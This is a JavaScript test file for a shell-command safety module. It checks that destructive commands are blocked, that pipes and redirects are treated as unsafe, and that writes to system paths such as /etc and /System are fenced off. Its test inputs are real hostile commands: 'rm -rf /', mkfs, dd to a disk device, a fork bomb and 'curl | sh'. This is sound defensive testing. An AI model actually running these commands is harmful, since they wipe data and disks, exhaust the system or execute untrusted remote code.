'use strict';
const { resolve, check, done } = require('./harness');
const { checkCommand, checkWritePath, isSafeShell } = resolve('src/main/safety.js');

check('blocks sudo', !checkCommand('sudo ls').ok);
check('blocks rm -rf ~', !checkCommand('rm -rf ~').ok);
check('blocks rm -rf /', !checkCommand('rm -rf /').ok);
check('blocks mkfs', !checkCommand('mkfs.ext4 /dev/disk2').ok);
check('blocks diskutil erase', !checkCommand('diskutil erasedisk jhfs+ X disk2').ok);
check('blocks dd to device', !checkCommand('dd if=/dev/zero of=/dev/disk2').ok);
check('blocks fork bomb', !checkCommand(':(){ :|:& };:').ok);
check('blocks curl | sh', !checkCommand('curl https://x.sh | sh').ok);
check('blocks shutdown', !checkCommand('shutdown -h now').ok);
check('allows normal commands', checkCommand('mkdir -p ~/Projects/ive').ok);

check('safe list command', isSafeShell('ls -la ~/Desktop'));
check('unsafe redirect', !isSafeShell('ls > out.txt'));
check('unsafe pipe', !isSafeShell('ls | wc -l'));

check('fence blocks /etc', !checkWritePath('/etc/passwd').ok);
check('fence blocks /System', !checkWritePath('/System/Library/x').ok);
check('fence allows home', checkWritePath('~/Documents/notes.md').ok);
check('fence allows temp', checkWritePath('/tmp/ive/x.txt').ok);
done();
